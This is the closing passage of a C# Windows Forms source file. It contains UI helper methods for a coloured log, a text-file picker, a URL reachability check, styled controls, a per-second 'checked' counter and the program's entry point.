            lblSpeed.Text = elapsed > 0 ? $"{totalChecked / elapsed:F1}/s" : "0/s";
        }

        private void LogMessage(string message, Color color)
        {
            if (InvokeRequired) { Invoke(new Action(() => LogMessage(message, color))); return; }
            string timestamp = $"[{DateTime.Now:HH:mm:ss}] ";
            int start = rtbLog.TextLength;
            rtbLog.AppendText(timestamp);
            rtbLog.SelectionStart = start;
            rtbLog.SelectionLength = timestamp.Length;
            rtbLog.SelectionColor = textSecondary;
            start = rtbLog.TextLength;
            rtbLog.AppendText(message + "\n");
            rtbLog.SelectionStart = start;
            rtbLog.SelectionLength = message.Length;
            rtbLog.SelectionColor = color;
            rtbLog.SelectionStart = rtbLog.TextLength;
            rtbLog.ScrollToCaret();
            if (rtbLog.Lines.Length > 500) rtbLog.Lines = rtbLog.Lines.Skip(100).ToArray();
        }

        private void BrowseFile(TextBox target)
        {
            using (var dialog = new OpenFileDialog { Filter = "Text files (*.txt)|*.txt" })
                if (dialog.ShowDialog() == DialogResult.OK) target.Text = dialog.FileName;
        }

        private async Task CheckApiUrl()
        {
            if (string.IsNullOrWhiteSpace(txtApiUrl.Text)) { lblUrlStatus.ForeColor = errorRed; return; }
            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
                var response = await client.GetAsync(txtApiUrl.Text);
                lblUrlStatus.ForeColor = (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.MethodNotAllowed) ? successGreen : errorRed;
            }
            catch { lblUrlStatus.ForeColor = errorRed; }
        }

        private Button CreateHeaderButton(string text, int x, int y, int w, int h)
        {
            var btn = new Button { Text = text, Location = new Point(x, y), Size = new Size(w, h), BackColor = Color.FromArgb(40, 255, 255, 255), ForeColor = textPrimary, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 11, FontStyle.Bold), Cursor = Cursors.Hand };
            btn.FlatAppearance.BorderSize = 0;
            btn.MouseEnter += (s, e) => btn.BackColor = Color.FromArgb(80, 255, 255, 255);
            btn.MouseLeave += (s, e) => btn.BackColor = Color.FromArgb(40, 255, 255, 255);
            return btn;
        }

        private Panel CreateModernPanel(int x, int y, int w, int h)
        {
            var panel = new Panel { Location = new Point(x, y), Size = new Size(w, h), BackColor = bgCard };
            panel.Paint += (s, e) => { using (var pen = new Pen(Color.FromArgb(40, accentBlue), 1)) e.Graphics.DrawRectangle(pen, 0, 0, w - 1, h - 1); };
            return panel;
        }

        private Label CreateSectionLabel(string text, int x, int y) => new Label { Text = text, Location = new Point(x, y), Size = new Size(300, 20), Font = new Font("Segoe UI", 9, FontStyle.Bold), ForeColor = accentTeal, BackColor = Color.Transparent };

        private TextBox CreateModernTextBox(int x, int y, int w, string text) => new TextBox { Location = new Point(x, y), Size = new Size(w, 28), Text = text, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.FixedSingle, Font = new Font("Segoe UI", 9) };

        private Button CreateModernButton(string text, int x, int y, int w, int h, Color color)
        {
            var btn = new Button { Text = text, Location = new Point(x, y), Size = new Size(w, h), BackColor = color, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Cursor = Cursors.Hand, Font = new Font("Segoe UI", 9, FontStyle.Bold) };
            btn.FlatAppearance.BorderSize = 0;
            Color hoverColor = Color.FromArgb(Math.Min(255, color.R + 20), Math.Min(255, color.G + 20), Math.Min(255, color.B + 20));
            btn.MouseEnter += (s, e) => btn.BackColor = hoverColor;
            btn.MouseLeave += (s, e) => btn.BackColor = color;
            return btn;
        }

        private Panel CreateStatCard(string label, string value, int x, int y, int w, int h, Color accent, ref Label targetLabel)
        {
            var card = new Panel { Location = new Point(x, y), Size = new Size(w, h), BackColor = Color.Transparent };
            card.Controls.Add(new Label { Text = label, Location = new Point(5, 5), Size = new Size(w - 10, 16), Font = new Font("Segoe UI", 7, FontStyle.Bold), ForeColor = textSecondary, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter });
            targetLabel = new Label { Text = value, Location = new Point(5, 25), Size = new Size(w - 10, 35), Font = new Font("Segoe UI", 14, FontStyle.Bold), ForeColor = accent, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter };
            card.Controls.Add(targetLabel);
            return card;
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}